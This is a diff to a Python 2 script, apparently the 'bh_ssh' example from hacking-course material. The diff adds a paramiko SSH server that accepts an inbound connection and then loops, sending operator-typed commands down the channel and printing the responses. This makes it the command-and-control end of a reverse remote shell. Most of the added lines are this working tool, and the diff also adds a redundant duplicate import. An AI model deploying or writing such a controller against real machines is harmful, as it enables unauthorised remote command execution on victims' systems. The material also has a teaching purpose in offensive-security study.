@@ -1,9 +1,11 @@
 import socket
 import paramiko
+import paramiko
 import threading
 import sys
+import traceback
 
-host_key = paramiko.RSAKey(filename='')
+host_key = paramiko.RSAKey(filename='test_rsa.key')
 
 
 class Server(paramiko.ServerInterface):
@@ -27,9 +29,44 @@ try:
     print '[+] Listening for connection...'
     client, addr = sock.accept()
 except Exception, e:
+    traceback.print_exc()
     print '[-] Listen failed:' + str(e)
     sys.exit(0)
 print '[+] Got a connection!'
 
+
+try:
+    bhSession = paramiko.Transport(client)
+    bhSession.add_server_key(host_key)
+    server = Server()
+    try:
+        bhSession.start_server(server=server)
+    except paramiko.SSHException, x:
+        print '[-] SSH negotiation failed'
+    chan = bhSession.accept(20)
+    print '[+] Authenticated'
+    print chan.recv(1024)
+    chan.send('Welcome to bh_ssh')
+    while True:
+        try:
+            command = raw_input('Enter command:').strip('\n')
+            if command != 'exit':
+                chan.send(command)
+                print chan.recv(1024) + '\n'
+            else:
+                chan.send('exit')
+                print 'exiting'
+                bhSession.close()
+                raise Exception ('exit')
+        except KeyboardInterrupt:
+            bhSession.close()
+
+except Exception, e:
+    print '[-] Caught exception:' +str(e)
+    try:
+        bhSession.close()
+    except:
+        pass
+    sys.exit(1)
 
 
